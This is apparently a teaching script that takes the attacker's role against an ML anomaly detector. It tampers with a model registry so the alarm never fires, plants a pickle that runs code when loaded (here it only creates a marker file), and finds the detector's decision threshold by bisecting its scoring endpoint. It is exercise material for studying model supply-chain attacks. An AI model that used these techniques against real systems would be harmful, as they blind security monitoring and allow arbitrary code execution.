#!/usr/bin/env python3
"""ai-detector/attack.py — the ATTACKER's role (teaching artifact; nothing leaves your container).

The attacker here has two footholds and no secrets:
  * write access to the MODEL REGISTRY (like Part 7's compromised update source), and
  * network access to the detector's /score endpoint, if one is exposed.
They do NOT have the vendor's signing key.

    python ai-detector/attack.py swap-model  --registry ai-detector/registry   # AML.T0010.003 + AML.T0018.000
    python ai-detector/attack.py evil-pickle --registry ai-detector/registry   # AML.T0011.000
    python ai-detector/attack.py probe --url http://127.0.0.1:8095              # AML.T0040 -> AML.T0043.001

evil-pickle's payload is deliberately harmless: on load it creates the empty file
/tmp/aidet-model-ran-code, which is proof that loading the "model" executed the attacker's code.
"""
import argparse
import json
import os
import pickle
import sys
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import aidet  # noqa: E402

MARKER = "/tmp/aidet-model-ran-code"


class RunsOnLoad:
    """Unpickling this object CALLS open(MARKER, 'w'). Any callable could sit here instead."""

    def __reduce__(self):
        return (open, (MARKER, "w"))


def _rehash_manifest(cur, extra=None):
    mpath = os.path.join(cur, "manifest.json")
    m = json.load(open(mpath))
    if extra:
        m["files"].update(extra)
    for n in m["files"]:
        m["files"][n] = aidet.sha256_file(os.path.join(cur, n))
    body = json.dumps(m, indent=2, sort_keys=True).encode()
    open(mpath, "wb").write(body)              # manifest.sig is left as it was: no vendor key


def _victim_state(cur):
    """Read the current model the attacker found in the registry (pickle or signed)."""
    pkl = os.path.join(cur, "model.pkl")
    if os.path.exists(pkl):
        with open(pkl, "rb") as f:
            return pickle.load(f)
    raise SystemExit("no model.pkl in the registry to start from")


def swap_model(registry, keep_manifest=False):
    cur = aidet.registry_current(registry)
    if os.path.exists(os.path.join(cur, "manifest.json")):
        mj = os.path.join(cur, "model.json")
        st = json.load(open(mj))
        st["threshold"] = -1e9                 # "everything is normal": the alarm can never fire
        json.dump(st, open(mj, "w"), indent=2)
        if keep_manifest:
            print("edited model.json (threshold -> -1e9); manifest untouched -> its SHA-256 no longer matches")
        else:
            _rehash_manifest(cur)
            print("edited model.json (threshold -> -1e9) and re-hashed manifest.json; "
                  "manifest.sig is stale (no vendor key to re-sign)")
        return
    st = _victim_state(cur)
    st["threshold"] = -1e9
    with open(os.path.join(cur, "model.pkl"), "wb") as f:
        pickle.dump(st, f)
    print(f"replaced {cur}/model.pkl with a model whose alarm can never fire (threshold -1e9)")


def evil_pickle(registry):
    cur = aidet.registry_current(registry)
    signed = os.path.exists(os.path.join(cur, "manifest.json"))
    if signed:                                  # signed registry: drop a pickle in and list it
        st = {"format": "aidet-pickle-1", "threshold": -1e9}
    else:
        st = _victim_state(cur)
        st["threshold"] = -1e9
    st["_"] = RunsOnLoad()
    with open(os.path.join(cur, "model.pkl"), "wb") as f:
        pickle.dump(st, f)
    if signed:
        _rehash_manifest(cur, {"model.pkl": ""})
        print("added model.pkl (runs code on load) to the signed registry and re-hashed the manifest "
              "(signature now stale)")
    else:
        print(f"replaced {cur}/model.pkl — loading it runs code (creates {MARKER}) and returns a model "
              "that never alarms")
    if os.path.exists(MARKER):
        os.unlink(MARKER)                       # start clean so the victim's load is what creates it


def probe(url, lo=15.0, hi=-120.0, n=25):
    """Black-box boundary search: bisect β between a value the detector accepts (lo) and one it
    rejects (hi). Each answer halves the interval — a verdict alone is enough in one dimension."""
    print(f"bisecting β between {lo} (accepted) and {hi} (rejected) via {url}/score")
    q = 0
    for _ in range(n):
        mid = (lo + hi) / 2
        try:
            with urllib.request.urlopen(f"{url}/score?beta={mid:.4f}&gamma=0", timeout=5) as r:
                ans = json.load(r)
        except urllib.error.HTTPError as e:
            print(f"  query {q + 1}: HTTP {e.code} {json.load(e).get('error', '')}")
            break
        q += 1
        print(f"  query {q:2}: β={mid:9.4f}  -> {ans}")
        if ans["verdict"] == "OK":
            lo = mid
        else:
            hi = mid
    print(f"after {q} queries the alarm boundary lies between β={hi:.3f} and β={lo:.3f} "
          f"(width {abs(lo - hi):.4f}°)")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    s = sub.add_parser("swap-model")
    s.add_argument("--registry", default=os.path.join(aidet.HERE, "registry"))
    s.add_argument("--keep-manifest", action="store_true", help="signed registry: don't touch manifest.json")
    e = sub.add_parser("evil-pickle")
    e.add_argument("--registry", default=os.path.join(aidet.HERE, "registry"))
    p = sub.add_parser("probe")
    p.add_argument("--url", default="http://127.0.0.1:8095")
    p.add_argument("--queries", type=int, default=25)
    a = ap.parse_args()
    if a.cmd == "swap-model":
        swap_model(a.registry, a.keep_manifest)
    elif a.cmd == "evil-pickle":
        evil_pickle(a.registry)
    else:
        probe(a.url, n=a.queries)
    return 0


if __name__ == "__main__":
    sys.exit(main())
